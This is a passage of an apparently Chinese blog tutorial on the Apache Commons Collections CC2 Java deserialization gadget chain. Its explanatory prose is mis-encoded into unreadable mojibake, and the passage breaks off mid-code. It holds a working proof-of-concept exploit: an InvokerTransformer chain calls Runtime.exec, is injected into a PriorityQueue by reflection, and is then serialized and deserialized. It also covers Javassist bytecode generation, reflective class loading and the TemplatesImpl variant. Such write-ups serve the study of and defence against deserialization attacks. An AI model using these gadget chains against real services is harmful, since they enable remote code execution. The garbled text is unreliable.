class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        deserialize(<span class="string">&quot;cc2-1.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc2-1.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è¿è¡Œç¨‹åºä¼šå¼¹å‡ºä¸¤æ¬¡è®¡ç®—å™¨ï¼Œä½†æ˜¯è¿™ä¸ªé“¾æ˜¯å¤±è´¥çš„ï¼Œå¦‚æœåœ¨ååºåˆ—åŒ–å¤„æ‰“ä¸€ä¸ªæ–­ç‚¹ä¼šå‘ç°ç¨‹åºå®é™…ä¸Šæ ¹æœ¬æ²¡æœ‰è¿›è¡Œååºåˆ—åŒ–ï¼Œè€Œæ˜¯æå‰ç»ˆæ­¢äº†ã€‚è¿™è¯´æ˜ä¸¤æ¬¡å‘½ä»¤æ‰§è¡Œåœ¨åºåˆ—åŒ–ä¹‹å‰ï¼Œä¹‹åå°±è¢«æŠ›å‡ºçš„å¼‚å¸¸ç»ˆæ­¢äº†</p><p>è°ƒè¯•ç¨‹åºï¼Œåœ¨<code>priorityQueue</code>è°ƒç”¨<code>add()</code>æ—¶æ­¥å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> offer(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºæ‰§è¡Œäº†<code>offer()</code>æ–¹æ³•ï¼Œæ­¥å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">            grow(i + <span class="number">1</span>);</span><br><span class="line">        size = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            queue[<span class="number">0</span>] = e;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUp(i, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è°ƒç”¨<code>add()</code>æ—¶ï¼Œç›´æ¥æ”¾å…¥å…ƒç´ ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨<code>add()</code>æ—¶ï¼Œä¼šæ‰§è¡Œ<code>siftUp()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUp</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftUpUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUpComparable(k, x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè®¾ç½®äº†<code>comparator</code>ä¸º<code>transformingComparator</code>æ­¤æ—¶ä¼šè¿›å…¥<code>siftUpUsingComparator()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = e;</span><br><span class="line">            k = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>siftUpUsingComparator()</code>ä¹Ÿè°ƒç”¨äº†<code>compare()</code>è¿™å°±æ˜¯ç¨‹åºåœ¨åºåˆ—åŒ–å‰æ‰§è¡Œå‘½ä»¤çš„åŸå› ï¼Œç»§ç»­çœ‹<code>compare()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç”±äºåœ¨æ„é€ <code>transformingComparator</code>æ—¶ä½¿ç”¨äº†å•å‚æ•°çš„æ„é€ å™¨ï¼Œå¯¼è‡´<code>this.decorated</code>è¢«èµ‹å€¼ä¸ºé»˜è®¤çš„<code>ComparatorUtils.NATURAL_COMPARATOR</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Comparator</span> <span class="variable">NATURAL_COMPARATOR</span> <span class="operator">=</span> ComparableComparator.comparableComparator();</span><br></pre></td></tr></table></figure><p>è¿›å…¥<code>ComparableComparator.comparableComparator()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;? <span class="built_in">super</span> E&gt;&gt; ComparableComparator&lt;E&gt; <span class="title function_">comparableComparator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥é™æ€æ–¹æ³•è¿”å›äº†<code>INSTANCE</code>å­—æ®µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ComparableComparator</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComparableComparator</span>();</span><br></pre></td></tr></table></figure><p>å…¶å®é»˜è®¤çš„<code>this.decorated</code>å°±æ˜¯ä¸€ä¸ª<code>ComparableComparator</code>å®ä¾‹ï¼Œè¿™ä¸ªç±»çš„<code>compare()</code>æ–¹æ³•å†³å®šäº†æŠ›å‡ºå¼‚å¸¸çš„åŸå› </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(E obj1, E obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> obj1.compareTo(obj2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æ¥å—ä¸¤ä¸ªæ³›å‹å¯¹è±¡ï¼Œä»è¯¥ç±»çš„ç­¾åä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComparableComparator</span>&lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;? <span class="built_in">super</span> E&gt;&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;E&gt;, Serializable</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæ¥å—çš„ä¸¤ä¸ªå‚æ•°éœ€è¦æ˜¯<code>Comparable</code>æ¥å£çš„å®ç°ç±»ï¼Œè€Œåœ¨<code>PriorityQueue</code>ç±»ä¸­æ‰§è¡Œ<code>compare()</code>åçš„ä¸¤ä¸ª<code>value1</code>å’Œ<code>value2</code>è¿”å›çš„æ˜¯å‘½ä»¤æ‰§è¡Œçš„<code>Process</code>ç±»å‹ï¼Œè¿™å°±æ˜¯æŠ¥é”™çš„åŸå› </p><p>è¦è§£å†³çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨æ‰§è¡Œ<code>add()</code>ä¹‹å‰å…ˆä¸å¾€<code>PriorityQueue</code>ä¼ å…¥<code>transformingComparator</code>ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œ<code>siftUp()</code>æ—¶<code>comparator</code>å­—æ®µä¸ºç©ºï¼Œè¿›å…¥<code>siftUpComparable()</code>ï¼Œä¸å†è°ƒç”¨<code>compare()</code>ï¼Œ<code>add()</code>æ‰§è¡Œå®Œæ¯•åå†é€šè¿‡åå°„ä¿®æ”¹<code>comparator</code>ä¸º<code>transformingComparator</code>ï¼Œè‡³æ­¤æ•´æ¡é“¾æ„å»ºå®Œæ¯•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        PriorityQueue&lt;Integer&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(priorityQueue, transformingComparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        deserialize(<span class="string">&quot;cc2-1.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc2-1.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬ååºåˆ—åŒ–äº†ä¸€ä¸ª<code>PriorityQueue</code>å¯¹è±¡ï¼Œç±»å†…éƒ¨çš„è°ƒç”¨é¡ºåºæ˜¯<code>readObject()</code>-&gt;<code>heapify()</code>-&gt;<code>siftDown()</code>-&gt;<code>siftDownUsingComparator()</code>-&gt;<code>compare()</code>ï¼Œä¹‹åçš„é¡ºåºåˆ™ä¸CC1ä¿æŒä¸€è‡´</p></br><h2 id="åŠ¨æ€ç±»åŠ è½½æœºåˆ¶"><a href="#åŠ¨æ€ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="åŠ¨æ€ç±»åŠ è½½æœºåˆ¶"></a>åŠ¨æ€ç±»åŠ è½½æœºåˆ¶</h2><p>Javaçš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶å…è®¸åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ è½½ç±»å¯¹è±¡ï¼Œ<code>Javassist</code>æ˜¯ä¸€ä¸ªJavaå­—èŠ‚ç æ“ä½œå·¥å…·åŒ…ï¼Œèƒ½å¤Ÿç®€åŒ–åŠ¨æ€åˆ›å»ºå’Œä¿®æ”¹ç±»çš„è¿‡ç¨‹ã€‚</p><h3 id="ä½¿ç”¨Javassiståˆ›å»ºç±»"><a href="#ä½¿ç”¨Javassiståˆ›å»ºç±»" class="headerlink" title="ä½¿ç”¨Javassiståˆ›å»ºç±»"></a>ä½¿ç”¨Javassiståˆ›å»ºç±»</h3><p>è¿›è¡Œåˆ›å»ºç±»ä¹‹å‰ï¼Œéœ€è¦å®ä¾‹åŒ–ä¸€ä¸ª<code>ClassPool</code>å¯¹è±¡æ¥åˆ›å»ºç±»ï¼Œå¯ä»¥ä½¿ç”¨å…¶é™æ€æ–¹æ³•<code>getDefault()</code>è·å–</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br></pre></td></tr></table></figure><p><code>ClassPool</code>æœ‰<code>makeClass(</code>)æ–¹æ³•ç”¨äºæ„å»ºç±»ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºè¯¥ç±»çš„åç§°ï¼Œæˆ–è€…ä½¿ç”¨<code>get()</code>æ–¹æ³•ï¼Œä¼ å…¥çš„å‚æ•°æ˜¯è¯¥ç±»çš„è·¯å¾„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">test2</span> <span class="operator">=</span> pool.get(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>CtField</code>ç±»çš„<code>make()</code>æ–¹æ³•å¯ä»¥ä¸ºåˆ›å»ºçš„ç±»è®¾ç½®å±æ€§ï¼Œè¯¥æ–¹æ³•ä¼ å…¥å±æ€§çš„ç­¾åå’Œæ“ä½œçš„<code>CtClass</code>å¯¹è±¡ï¼Œå±æ€§ç­¾åéœ€è¦æ‰‹åŠ¨æ·»åŠ åˆ†å·ã€‚è®¾ç½®å®Œæˆåä½¿ç”¨<code>addField()</code>æ–¹æ³•ä¸ºåˆ›å»ºçš„ç±»æ·»åŠ è¯¥å±æ€§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtField</span> <span class="variable">testField</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;public String testField;&quot;</span>,test);</span><br><span class="line">test.addField(testField);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>CtMethod</code>ç±»çš„<code>make()</code>æ–¹æ³•å¯ä»¥ä¸ºåˆ›å»ºçš„ç±»è®¾ç½®æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼ å…¥æ–¹æ³•çš„ç­¾åå’Œæ“ä½œçš„<code>CtClass</code>å¯¹è±¡ï¼Œæ³¨æ„å¦‚æœä¸å†™<code>{ }</code>ç¨‹åºä¼šè‡ªåŠ¨æ·»åŠ <code>abstract</code>ä¿®é¥°ç¬¦ã€‚è®¾ç½®å®Œæˆåä½¿ç”¨<code>addMethod()</code>æ–¹æ³•ä¸ºåˆ›å»ºçš„ç±»æ·»åŠ è¯¥æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtMethod</span> <span class="variable">testMethod</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public String testMethod(String arg) &#123; return arg; &#125;&quot;</span>,test);</span><br><span class="line">test.addMethod(testMethod);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>CtMethod</code>ç±»çš„<code>setBody()</code>æ–¹æ³•å¯ä»¥ä¸ºå…¶æ·»åŠ æ–¹æ³•ä½“</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">testMethod.setBody(<span class="string">&quot;System.out.println(\&quot;test\&quot;);&quot;</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡å®ä¾‹åŒ–<code>CtConstructor</code>ç±»å¯ä¸ç”Ÿæˆæ„é€ å™¨ï¼Œæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ„é€ å™¨æ¥å—çš„å‚æ•°ç±»å‹ï¼Œä¸€ä¸ªæ˜¯è¦æ“ä½œçš„<code>CtClass</code>å¯¹è±¡ã€‚è®¾ç½®å®Œæˆåä½¿ç”¨<code>addConstructor()</code>æ–¹æ³•ä¸ºåˆ›å»ºçš„ç±»æ·»åŠ è¯¥æ„é€ å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span>  <span class="title class_">CtClass</span>[]&#123;CtClass.intType&#125;, test);</span><br><span class="line">test.addConstructor(constructor);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>CtClass</code>ç±»çš„<code>makeClassInitializer()</code>å¯ä»¥ä¸ºæ„å»ºçš„ç±»æ·»åŠ é™æ€ä»£ç å—ï¼Œè¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª<code>CtConstructor</code>ç±»å‹çš„å¯¹è±¡ï¼Œé™æ€ä»£ç å—ä¸éœ€è¦ä½¿ç”¨<code>addConstructor()</code>æ–¹æ³•å»æ·»åŠ </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">constructor1.setBody(<span class="string">&quot;System.out.println(\&quot;123\&quot;);&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>CtClass</code>ç±»çš„<code>writeFile()</code>æ–¹æ³•å¯ä»¥å°†åˆ›å»ºçš„ç±»çš„ç±»æ–‡ä»¶å¯¼å‡ºåˆ°å®šä¹‰çš„ç›®å½•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">test.writeFile(<span class="string">&quot;src/main/java/org/example&quot;</span>);</span><br></pre></td></tr></table></figure><p>åœ¨æŒ‡å®šç›®å½•ä¸‹ä¾¿ä¼šå‡ºç°<code>test.class</code>æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String testField;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMethod</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> var1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŠ è½½ç±»å¯¹è±¡"><a href="#åŠ è½½ç±»å¯¹è±¡" class="headerlink" title="åŠ è½½ç±»å¯¹è±¡"></a>åŠ è½½ç±»å¯¹è±¡</h3><p>ä½¿ç”¨<code>CtClass</code>ç±»çš„<code>toBytecode()</code>å¯ä»¥å°†å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚ç æ•°ç»„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = test.toBytecode();</span><br></pre></td></tr></table></figure><p><code>ClassLoader</code>ç±»çš„<code>defineClass()</code>æ–¹æ³•ç”¨äºå°†ç±»åŠ è½½åˆ°å†…å­˜ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len, ProtectionDomain protectionDomain)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line">        <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> defineClassSourceLocation(protectionDomain);</span><br><span class="line">        Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">        postDefineClass(c, protectionDomain);</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•è¢«<code>protected</code>ä¿®é¥°ï¼Œå¯ä»¥é€šè¿‡åå°„å»è°ƒç”¨å®ƒ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; invoke = (Class&lt;?&gt;) method.invoke(classLoader,bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">invoke.newInstance();</span><br></pre></td></tr></table></figure><p><code>invoke.newInstance()</code>ä¼šåŠ è½½<code>test</code>ç±»å¹¶å®ä¾‹åŒ–ï¼Œè§¦å‘é™æ€ä»£ç å—çš„æ‰§è¡Œ</p><br/><h2 id="ä¾èµ–TemplatesImplçš„CC2é“¾æ„å»ºè·¯å¾„"><a href="#ä¾èµ–TemplatesImplçš„CC2é“¾æ„å»ºè·¯å¾„" class="headerlink" title="ä¾èµ–TemplatesImplçš„CC2é“¾æ„å»ºè·¯å¾„"></a>ä¾èµ–TemplatesImplçš„CC2é“¾æ„å»ºè·¯å¾„</h2><p>è¯¥é“¾åˆ©ç”¨æ¶æ„çš„å­—èŠ‚ç æ–‡ä»¶ç”Ÿæˆæ¶æ„å¯¹è±¡æ¥è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåœ¨<code>TemplatesImpl</code>çš„<code>defineTransletClasses()</code>æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, 